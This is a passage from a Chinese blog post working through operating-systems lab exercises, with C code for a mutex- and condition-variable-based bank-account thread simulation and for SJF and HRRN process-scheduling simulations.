function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    pthread_mutex_init(&amp;Lock, <span class="literal">NULL</span>); <span class="comment">// 初始化互斥锁</span></span><br><span class="line"></span><br><span class="line">    operate(); <span class="comment">// 进行操作</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Final bank account: %d\n&quot;</span>, bank_account); <span class="comment">// 回显最后银行账户的信息</span></span><br><span class="line"></span><br><span class="line">    pthread_mutex_destroy(&amp;Lock); <span class="comment">// 销毁互斥锁</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>              </div>            </details><p>运行结果如下：</p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20241013143021163.png" alt="image-20241013143021163" style="zoom:80%;" /><h3 id="q2-2"><a class="markdownIt-Anchor" href="#q2-2"></a> Q2</h3><blockquote><p>本题的要求跟题目一的要求一样，唯一区别是：在本题中假设Mary和Sally的银行账户是不可借记的，即当余额少于取款额时，不能取款，取款线程需要阻塞等待直到账户有足够的钱。</p></blockquote><p>为了满足题目的新要求，即 <strong>Mary 和 Sally 的银行账户在余额不足时无法取款，取款线程需要阻塞等待</strong>，需要对取款操作做一些修改。我们可以使用条件变量 (<code>pthread_cond_t</code>) 来实现线程阻塞和唤醒的机制：<a href="https://blog.csdn.net/eidolon_foot/article/details/134509797">【C语言】条件变量(pthread_cond_t)_c语言条件变量-CSDN博客</a></p><ol><li><strong>添加条件变量</strong>：使用条件变量 <code>pthread_cond_t</code> 来实现取款线程的阻塞和唤醒。当余额不足时，取款线程会进入等待状态，直到有足够的钱进行取款。</li><li><strong>取款操作检测是否阻塞</strong>：在取款时检查余额。如果余额不足，则阻塞线程等待条件变量的信号。</li><li><strong>存款操作唤醒取款线程</strong>：每当有存款时，需要唤醒所有等待中的取款线程，检查是否现在可以取款。</li><li><strong>线程同步</strong>：由于涉及到多线程的等待和唤醒操作，所有操作仍需保证线程安全，继续使用互斥锁 <code>pthread_mutex_t</code>。</li></ol><p>所以只需要对<code>Deposit()</code>和<code>Withdraw()</code>这两个线程函数进行修改即可：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span>* <span class="title function_">Deposit</span><span class="params">(<span class="type">void</span>* arg)</span> &#123;</span><br><span class="line">    <span class="comment">// 新增特性：存款时将尝试唤醒所有条件变量，以恢复阻塞的取款线程</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">// 存款操作...</span></span><br><span class="line">    pthread_cond_broadcast(&amp;Cond); <span class="comment">// 存款后，唤醒所有条件变量，再次尝试取款</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span>* <span class="title function_">Withdraw</span><span class="params">(<span class="type">void</span>* arg)</span> &#123;</span><br><span class="line">    <span class="comment">// 新增特性：若取款后余额将为负数，则阻塞线程并释放锁</span></span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="keyword">while</span>(bank_account&lt;operator-&gt;op_amount)&#123;</span><br><span class="line">        <span class="comment">// 若此时银行余额小于取款操作钱款，则阻塞线程，释放锁。</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s is waiting to withdraw %d, but only %d is available, operation blockage.\n&quot;</span>,</span><br><span class="line">        operator-&gt;name,operator-&gt;op_amount,bank_account);</span><br><span class="line">        pthread_cond_wait(&amp;Cond,&amp;Lock);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//取款 ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>完整的代码如下：</p><details class="folding-tag" cyan><summary> 查看完整代码 </summary>              <div class='content'>              <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="type">char</span>* name; </span><br><span class="line">    <span class="type">int</span> op_amount; </span><br><span class="line">    <span class="type">int</span> op_times; </span><br><span class="line">    <span class="type">int</span> is_withdraw; </span><br><span class="line">&#125; Member;</span><br><span class="line"></span><br><span class="line">Member members[] = &#123;</span><br><span class="line">    &#123;<span class="string">&quot;Dad&quot;</span>, <span class="number">0</span>, <span class="number">2</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;Mom&quot;</span>, <span class="number">0</span>, <span class="number">2</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;Grandma&quot;</span>, <span class="number">0</span>, <span class="number">2</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;Grandpa&quot;</span>, <span class="number">0</span>, <span class="number">2</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;Uncle&quot;</span>, <span class="number">0</span>, <span class="number">2</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;Mary&quot;</span>, <span class="number">0</span>, <span class="number">2</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;Sally&quot;</span>, <span class="number">0</span>, <span class="number">2</span>&#125;,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> deposit_num[] = &#123;<span class="number">10</span>, <span class="number">20</span>, <span class="number">30</span>, <span class="number">40</span>, <span class="number">50</span>&#125;;</span><br><span class="line"><span class="type">int</span> withdraw_num[] = &#123;<span class="number">50</span>, <span class="number">100</span>&#125;;</span><br><span class="line"><span class="type">int</span> bank_account = <span class="number">10</span>;</span><br><span class="line"><span class="type">pthread_mutex_t</span> Lock;</span><br><span class="line"><span class="type">pthread_cond_t</span> Cond;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span>* <span class="title function_">Deposit</span><span class="params">(<span class="type">void</span>* arg)</span> &#123;</span><br><span class="line">    <span class="comment">// 新增特性：存款时将尝试唤醒所有条件变量，以恢复阻塞的取款线程</span></span><br><span class="line">    Member* operator = (Member*)arg;</span><br><span class="line"></span><br><span class="line">    pthread_mutex_lock(&amp;Lock);</span><br><span class="line">    bank_account += operator-&gt;op_amount;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s deposited %d, now the bank account has %d\n&quot;</span>,</span><br><span class="line">           operator-&gt;name, operator-&gt;op_amount, bank_account);</span><br><span class="line">    pthread_cond_broadcast(&amp;Cond); <span class="comment">// 存款后，唤醒所有条件变量，再次尝试取款</span></span><br><span class="line">    pthread_mutex_unlock(&amp;Lock);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(operator-&gt;name);</span><br><span class="line">    <span class="built_in">free</span>(operator);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span>* <span class="title function_">Withdraw</span><span class="params">(<span class="type">void</span>* arg)</span> &#123;</span><br><span class="line">    <span class="comment">// 新增特性：若取款后余额将为负数，则阻塞线程并释放锁</span></span><br><span class="line">    Member* operator = (Member*)arg;</span><br><span class="line"></span><br><span class="line">    pthread_mutex_lock(&amp;Lock);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(bank_account&lt;operator-&gt;op_amount)&#123;</span><br><span class="line">        <span class="comment">// 若此时银行余额小于取款操作钱款，则阻塞线程，释放锁。</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s is waiting to withdraw %d, but only %d is available, operation blockage.\n&quot;</span>,</span><br><span class="line">        operator-&gt;name,operator-&gt;op_amount,bank_account);</span><br><span class="line">        pthread_cond_wait(&amp;Cond,&amp;Lock);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    bank_account -= operator-&gt;op_amount;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s withdrew %d, now the bank account has %d\n&quot;</span>,</span><br><span class="line">           operator-&gt;name, operator-&gt;op_amount, bank_account);</span><br><span class="line"></span><br><span class="line">    pthread_mutex_unlock(&amp;Lock);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(operator-&gt;name);</span><br><span class="line">    <span class="built_in">free</span>(operator);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">load_operator</span><span class="params">(Member* rand_operator, <span class="type">int</span> rand_guy)</span> &#123; </span><br><span class="line">    rand_operator-&gt;name = strdup(members[rand_guy].name); </span><br><span class="line">    <span class="keyword">if</span> (rand_operator-&gt;name == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;strdup failed&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (rand_guy &lt;= <span class="number">4</span>) &#123; </span><br><span class="line">        rand_operator-&gt;is_withdraw = <span class="number">0</span>;</span><br><span class="line">        rand_operator-&gt;op_amount = deposit_num[rand_guy];</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        rand_operator-&gt;is_withdraw = <span class="number">1</span>;</span><br><span class="line">        rand_operator-&gt;op_amount = withdraw_num[rand_guy - <span class="number">5</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">operate</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    <span class="type">int</span> num = <span class="keyword">sizeof</span>(members) / <span class="keyword">sizeof</span>(members[<span class="number">0</span>]); </span><br><span class="line">    <span class="type">int</span> operate_num = <span class="number">0</span>; </span><br><span class="line">    <span class="type">int</span> thread_index = <span class="number">0</span>; </span><br><span class="line">    srand((<span class="type">unsigned</span> <span class="type">int</span>)time(<span class="literal">NULL</span>));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; num; i++) &#123;</span><br><span class="line">        operate_num += members[i].op_times;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">pthread_t</span>* threads = <span class="built_in">malloc</span>(operate_num * <span class="keyword">sizeof</span>(<span class="type">pthread_t</span>)); </span><br><span class="line">    <span class="keyword">if</span> (threads == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;malloc failed for threads&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (operate_num &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="type">int</span> rand_guy = rand() % num;</span><br><span class="line">        <span class="keyword">if</span> (members[rand_guy].op_times == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        members[rand_guy].op_times--;</span><br><span class="line"></span><br><span class="line">        Member* operator = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(Member));</span><br><span class="line">        <span class="keyword">if</span> (operator == <span class="literal">NULL</span>) &#123;</span><br><span class="line">            perror(<span class="string">&quot;malloc failed for operator&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        load_operator(operator, rand_guy); </span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (operator-&gt;is_withdraw) &#123; </span><br><span class="line">            pthread_create(&amp;threads[thread_index++], <span class="literal">NULL</span>, Withdraw, operator);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            pthread_create(&amp;threads[thread_index++], <span class="literal">NULL</span>, Deposit, operator);</span><br><span class="line">        &#125;</span><br><span class="line">        operate_num--;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; thread_index; i++) &#123;</span><br><span class="line">        pthread_join(threads[i], <span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(threads); </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    pthread_mutex_init(&amp;Lock, <span class="literal">NULL</span>); </span><br><span class="line">    pthread_cond_init(&amp;Cond,<span class="literal">NULL</span>); <span class="comment">// 初始化条件变量</span></span><br><span class="line"></span><br><span class="line">    operate(); </span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Final bank account: %d\n&quot;</span>, bank_account); </span><br><span class="line"></span><br><span class="line">    pthread_mutex_destroy(&amp;Lock); </span><br><span class="line">    pthread_cond_destroy(&amp;Cond); <span class="comment">// 销毁条件变量</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>              </div>            </details><p>运行结果如下：</p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20241013143933424.png" alt="image-20241013143933424" style="zoom:50%;" /><p>思考：假如已经有两个或多个取款线程进入阻塞，然后存款线程调用<code>pthread_cond_broadcast</code>唤醒所有阻塞的线程。此时会不会出现竞争？哪个被唤醒的线程会获得锁？</p><p>当存款线程通过 <code>pthread_cond_broadcast</code> 唤醒多个阻塞的取款线程时，<strong>确实可能发生竞争</strong>，但竞争的结果是受互斥锁保护的。每次只有一个线程能够获得锁并执行操作，其他线程会阻塞在锁上，直到锁被释放。</p><p>唤醒的线程是以一种不确定的顺序重新争夺锁的，具体哪个线程会优先获得锁取决于操作系统的调度策略。常见的调度策略可能是<strong>先唤醒的线程</strong>优先获得锁，但这并不是严格保证的，取决于内核调度器的实现。</p><p>如果只希望唤醒一个线程，可以用 <code>pthread_cond_signal</code> 代替 <code>pthread_cond_broadcast</code>，这只会唤醒一个等待的线程。不更改也没有关系，因为多线程争夺互斥锁对于共享变量是安全的，这种随机性不会对程序造成危害。</p><h2 id="lab03"><a class="markdownIt-Anchor" href="#lab03"></a> Lab03</h2><p>进程调度是现代操作系统中最核心的部分，它是现代操作系统能够实现多用户、多任务功能的根本保障。早期的批处理系统、不同版本的Windows、Linux等操作系统分别采用了不同的进程调度机制，例如，FCFS调度算法、SJF调度算法、HRRN调度算法、RR调度算法、多级反馈队列调度算法等。本次实验的目标如下：</p><ol><li>掌握Windows、Linux操作系统中进程调度机制及其原理。</li><li>学会用高级语言来模拟实现一些常用的非抢占式(Non-preemptive)进程调度算法。</li></ol><h3 id="q1-3"><a class="markdownIt-Anchor" href="#q1-3"></a> Q1</h3><blockquote><p>假设有10个进程，每个进程的到达时间(1-20之间的整数)、需要的运行时间(10-5之间的整数)都是随机生产。模拟实现短作业优先调度算法SJF，结果输出这10个进程的执行顺序，并计算输出每个进程的等待时间以及总的平均等待时间。</p><p>实验提示：<strong>本次实验不需要使用线程</strong>。另外，<strong>本次实验中的两种调度算法都是非抢占式(Non-preemptive)调度算法</strong>，即一个进程获得CPU后将一直执行到结束。要求实现一个排队器函数，用于产生下一个将获得CPU的进程。首先，生成10个进程(它们的到达时间、需要运行的时间、优先级由随机数产生)，然后由排队器来决定进程获得CPU的顺序。由于本次实验中的两种算法都是非抢占式，因此一个进程执行完成后，由排队器来产生下一个获得CPU的进程。对于HRRN算法，需要为每一个进程设置一个变量，用来记录其动态优先级。</p></blockquote><p>SJF(Shortest Job First )算法，即最短作业优先调度法。是以进入系统的作业所要求的CPU时间为标准，对短作业或者短进程优先调度的算法，将每个进程与其估计运行时间进行关联，选取估计计算时间最短的作业投入运行。</p><p>SJF调度算法是被证明了的最佳调度算法，这是因为对于给定的一组进程，SJF算法的平均周转时间最小。通过将短进程移到长进程之前，短进程等待时间的减少大于长进程等特时间的增加，因此，平均等待时间减少了。</p><p>但在实际运用中，SJF算法是达不到理论上的最佳效果的。因为实现SJF调度算法需要知道作业所需运行时间，否则调度就没有依据，要精确知道一个作业的运行时间是办不到的。而且还会出现<span class="bubble-content">饥饿</span><span class="bubble-notation"><span class="bubble-item" style="background-color:#ec5830;">进程饥饿，即为Starvation，指当等待时间给进程推进和响应带来明显影响称为进程饥饿。当饥饿到一定程度的进程在等待到即使完成也无实际意义的时候称为饥饿死亡。</span></span>现象。</p><p>要模拟实现SFJ其实并不难。在现实情况中，由于进程的到达时间并不确定，所以是一个动态的排序算法。但是在模拟中实现，我们可以预先用随机数生成好进程的抵达时间、运行时间等各种信息，然后用排队器函数提前处理好。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">qsort(processes, NUM_PROCESSES, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> PCB), compare);</span><br></pre></td></tr></table></figure><p>至于排队器函数的处理逻辑实现也很简单：根据进程的运行时间进行排序，运行时间短的优先级更高；如果运行时间相同，则比较哪个进程的抵达时间更早。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">compare</span><span class="params">(<span class="type">const</span> <span class="type">void</span> *a, <span class="type">const</span> <span class="type">void</span> *b)</span> &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">PCB</span> *<span class="title">p1</span> =</span> (<span class="keyword">struct</span> PCB *)a;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">PCB</span> *<span class="title">p2</span> =</span> (<span class="keyword">struct</span> PCB *)b;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 优先比较需要用时，如果时间相同则比较到达时间</span></span><br><span class="line">    <span class="keyword">if</span> (p1-&gt;neededTime == p2-&gt;neededTime)</span><br><span class="line">        <span class="keyword">return</span> p1-&gt;arrivalTime - p2-&gt;arrivalTime;</span><br><span class="line">    <span class="keyword">return</span> p1-&gt;neededTime - p2-&gt;neededTime;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>用排队器对进程队列进行排序处理后，我们就可以依次遍历每个处理好的有序进程，计算并打印它们的信息即可。</p><p>完整代码如下：</p><details class="folding-tag" cyan><summary> 查看完整代码 </summary>              <div class='content'>              <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NUM_PROCESSES 10</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">PCB</span> &#123;</span></span><br><span class="line">    <span class="type">char</span> pid[<span class="number">64</span>];</span><br><span class="line">    <span class="type">char</span> state;</span><br><span class="line">    <span class="type">int</span> priority;</span><br><span class="line">    <span class="type">int</span> neededTime;</span><br><span class="line">    <span class="type">int</span> totalWaitTime;</span><br><span class="line">    <span class="type">int</span> arrivalTime;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">PCB</span> *<span class="title">next</span>;</span> <span class="comment">// 实际上并没用到指针，用数组代替了</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 随机生成进程</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">generateProcesses</span><span class="params">(<span class="keyword">struct</span> PCB processes[])</span> &#123;</span><br><span class="line">    srand(time(<span class="number">0</span>));  </span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; NUM_PROCESSES; i++) &#123;</span><br><span class="line">        <span class="built_in">snprintf</span>(processes[i].pid, <span class="keyword">sizeof</span>(processes[i].pid), <span class="string">&quot;P%d&quot;</span>, i + <span class="number">1</span>);</span><br><span class="line">        processes[i].state = <span class="string">&#x27;w&#x27;</span>;</span><br><span class="line">        processes[i].priority = <span class="number">0</span>;</span><br><span class="line">        processes[i].neededTime = (rand() % <span class="number">41</span>) + <span class="number">10</span>;  <span class="comment">// 随机生成需要的时间1~50</span></span><br><span class="line">        processes[i].arrivalTime = (rand() % <span class="number">20</span>) + <span class="number">1</span>;  <span class="comment">// 随机生成抵达时间1~20</span></span><br><span class="line">        processes[i].totalWaitTime = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 撰写SFJ排序器的比较逻辑</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">compare</span><span class="params">(<span class="type">const</span> <span class="type">void</span> *a, <span class="type">const</span> <span class="type">void</span> *b)</span> &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">PCB</span> *<span class="title">p1</span> =</span> (<span class="keyword">struct</span> PCB *)a;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">PCB</span> *<span class="title">p2</span> =</span> (<span class="keyword">struct</span> PCB *)b;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 优先比较需要用时，如果时间相同则比较到达时间</span></span><br><span class="line">    <span class="keyword">if</span> (p1-&gt;neededTime == p2-&gt;neededTime)</span><br><span class="line">        <span class="keyword">return</span> p1-&gt;arrivalTime - p2-&gt;arrivalTime;</span><br><span class="line">    <span class="keyword">return</span> p1-&gt;neededTime - p2-&gt;neededTime;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 模拟SFJ调度排序器</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">SJF</span><span class="params">(<span class="keyword">struct</span> PCB processes[])</span> &#123;</span><br><span class="line">    <span class="comment">// 对进程进行排序，运行时间少、抵达时间早的优先</span></span><br><span class="line">    qsort(processes, NUM_PROCESSES, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> PCB), compare);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> currentTime = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> totalWaitTime = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Execution Order:\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; NUM_PROCESSES; i++) &#123;</span><br><span class="line">        <span class="comment">// 如果第一个进程的抵达时间晚于现在的时间，则等待第一个进程开始</span></span><br><span class="line">        <span class="keyword">if</span> (currentTime &lt; processes[i].arrivalTime) &#123;</span><br><span class="line">            currentTime = processes[i].arrivalTime;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 计算进程等待时间：当前的时间 - 抵达的时间</span></span><br><span class="line">        processes[i].totalWaitTime = currentTime - processes[i].arrivalTime;</span><br><span class="line">        <span class="comment">// 计算等待总时间</span></span><br><span class="line">        totalWaitTime += processes[i].totalWaitTime;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Process %s - Arrival Time: %d, Needed Time: %d, Wait Time: %d\n&quot;</span>,</span><br><span class="line">               processes[i].pid, processes[i].arrivalTime, processes[i].neededTime, processes[i].totalWaitTime);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 更新当前的时间</span></span><br><span class="line">        currentTime += processes[i].neededTime;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 计算等待平均时间</span></span><br><span class="line">    <span class="type">double</span> avgWaitTime = (<span class="type">double</span>)totalWaitTime / NUM_PROCESSES;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Total Wait Time: %d\n&quot;</span>, totalWaitTime);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Average Wait Time: %.2f\n&quot;</span>, avgWaitTime);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">PCB</span> <span class="title">processes</span>[<span class="title">NUM_PROCESSES</span>];</span></span><br><span class="line">    </span><br><span class="line">    generateProcesses(processes);</span><br><span class="line"></span><br><span class="line">    SJF(processes);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>              </div>            </details><p>运行结果如下：</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20241014215208267.png" alt="image-20241014215208267" /></p><h3 id="q2-3"><a class="markdownIt-Anchor" href="#q2-3"></a> Q2</h3><blockquote><p>假设有10个进程，每个进程的到达时间(1-20之间的整数)、需要的运行时间(10-50之间的整数)都是随机生产。模拟实现最高响应比优先调度算法HRRN，结果输出这10个进程的执行顺序，并计算输出每个进程的等待时间以及总的平均等待时间。</p></blockquote><p>高响应比优先调度算法（Highest Response Ratio Next）是一种对CPU中央控制器响应比的分配的一种算法。HRRN是介于FCFS（先来先服务算法）与SJF（短作业优先算法）之间的折中算法，既考虑作业等待时间又考虑作业运行时间，既照顾短作业又不使长作业等待时间过长，改进了调度性能。它解决了SFJ中长作业时间进程的饥饿问题，但是付出了更多的资源去计算响应比，提升了系统开销。</p><p>实际上就是以<span class='p red'>响应比</span>来代替<span class='p yellow'>作业时间</span>作为排序标准，响应比的计算公式如下：</p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>r</mi><mi>e</mi><mi>s</mi><mi>p</mi><mi>o</mi><mi>n</mi><mi>s</mi><mi>e</mi><mi mathvariant="normal">_</mi><mi>r</mi><mi>a</mi><mi>t</mi><mi>i</mi><mi>o</mi><mo>=</mo><mo stretchy="false">(</mo><mi>w</mi><mi>a</mi><mi>i</mi><mi>t</mi><mi>i</mi><mi>n</mi><mi>g</mi><mi mathvariant="normal">_</mi><mi>t</mi><mi>i</mi><mi>m</mi><mi>e</mi><mo>+</mo><mi>r</mi><mi>u</mi><mi>n</mi><mi>t</mi><mi>i</mi><mi>m</mi><mi>e</mi><mo stretchy="false">)</mo><mi mathvariant="normal">/</mi><mo stretchy="false">(</mo><mi>r</mi><mi>u</mi><mi>n</mi><mi>t</mi><mi>i</mi><mi>m</mi><mi>e</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">response\_ratio=(waiting\_time+runtime)/(runtime)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9695199999999999em;vertical-align:-0.31em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal">e</span><span class="mord mathnormal">s</span><span class="mord mathnormal">p</span><span class="mord mathnormal">o</span><span class="mord mathnormal">n</span><span class="mord mathnormal">s</span><span class="mord mathnormal">e</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal">a</span><span class="mord mathnormal">t</span><span class="mord mathnormal">i</span><span class="mord mathnormal">o</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.06em;vertical-align:-0.31em;"></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="mord mathnormal">a</span><span class="mord mathnormal">i</span><span class="mord mathnormal">t</span><span class="mord mathnormal">i</span><span class="mord mathnormal">n</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal">t</span><span class="mord mathnormal">i</span><span class="mord mathnormal">m</span><span class="mord mathnormal">e</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal">u</span><span class="mord mathnormal">n</span><span class="mord mathnormal">t</span><span class="mord mathnormal">i</span><span class="mord mathnormal">m</span><span class="mord mathnormal">e</span><span class="mclose">)</span><span class="mord">/</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal">u</span><span class="mord mathnormal">n</span><span class="mord mathnormal">t</span><span class="mord mathnormal">i</span><span class="mord mathnormal">m</span><span class="mord mathnormal">e</span><span class="mclose">)</span></span></span></span></p><p>其中等待时间是不断变化的，所以响应比也是不断变化的。对SFJ算法的进程处理方法已经不适用，因为此时进程之间的优先级是动态的。所以我们的处理逻辑也需要改变：对于每个时间单位，计算一次响应比并对进程列表进行排序，选择优先级最高的进程分配CPU资源执行。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">calculateResponseRatio(processes,currentTime); <span class="comment">// 计算响应比</span></span><br><span class="line"></span><br><span 